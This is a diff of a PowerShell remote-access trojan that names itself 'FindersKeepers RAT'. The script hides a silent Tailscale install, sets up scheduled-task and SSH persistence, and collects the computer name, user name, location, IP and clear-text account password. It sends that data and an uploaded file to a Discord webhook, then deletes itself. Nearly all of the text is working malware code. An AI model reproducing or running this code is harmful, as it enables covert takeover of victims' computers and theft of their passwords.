@@ -31,9 +31,6 @@ function installTailscale {
   ## Download and install tailnet
   Invoke-Webrequest -Uri https://pkgs.tailscale.com/stable/tailscale-setup-1.50.1-amd64.msi -OutFile file.msi
   msiexec.exe /a file.msi /quiet
-
-  ## Hide Tailnet folder in C
-  Get-Item "C:\tailscale" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
   
   ## Adds Tailscale to task scheduler
   $name = "Tailscale"
@@ -175,7 +172,6 @@ $rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAcc
 $group = (((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value) -Split "\\")[1]
 $Webhook = Get-Content ./webhook
 $authKey = Get-Content ./authKey
-$language = (Get-WinUserLanguageList)[0].autonym
 $country = ((((Get-WinHomeLocation)[0] | Select-Object HomeLocation) | ConvertTo-Json -Compress -Depth 100)[17..300] -join '') 
 $country = $country.Substring(0, $country.length - 2)
 
@@ -200,26 +196,31 @@ Set-Location $PSScriptRoot
 
 Start-Sleep 5
 removeIcon -ProgramPath "C:\Tailscale\tailscale-ipn.exe" -Hide 
-# FIXME: Configure Tailscale on target pc right 
 Set-Location C:\Tailscale\
 Start-Process -FilePath ".\tailscaled.exe" -windowstyle hidden -Verb RunAs
 Start-Process -FilePath ".\tailscale.exe" -windowstyle hidden -Verb RunAs -ArgumentList 'up --authkey $authKey --unattended'
 Set-Location $temp\$dirName
 
 ## Sends Discord Webhook
-$description = 
-"New Computer infected 
+# FIXME: Message isn't beeing send
+$description = @"
+New Computer infected 
 ---------------------------------
 Computer Name = $env:computername 
 User Name = $env:username
-Computer Language = $language
+Computer Language = $env:LANG
 Location (country) = $country
 IP = $ip
-Account Password = $pwordClear"
+Account Password = $pwordClear
+"@
 New-Item ./$env:computername.fk -Value ( " " + $ip," " + $pwordClear,"C:/Users/$uName","Ignore this file if you aren't familiar with Network Statistics" -join [Environment]::NewLine + [Environment]::NewLine )
-$payload = [PSCustomObject]@{content=$description}
-Invoke-RestMethod -Uri $Webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json';
+$payload = @{
+  'username' = 'FindersKeepers RAT'
+  'content'  = $description
+}
+Invoke-RestMethod -Uri $Webhook -Method Post -Body $payload;
 curl.exe -F "file1=@./$env:computername.fk" $Webhook
+Pause
 
 ## Enable persistent SSH
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
@@ -233,6 +234,6 @@ Remove-Item "$PSScriptRoot/webhook"
 Remove-Item "$PSScriptRoot/authkey"
 Remove-Item $PSCommandPath -Force 
 
-## Lock the Computer to activate the Tailscale on Login
+## Finish Tailscale installation
+Get-Item "C:\tailscale" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
 Start-Process -FilePath 'C:\Tailscale\tailscale.exe' -windowstyle hidden -Verb RunAs -ArgumentList "up --authkey $authKey --unattended"
-rundll32.exe user32.dll,LockWorkStation
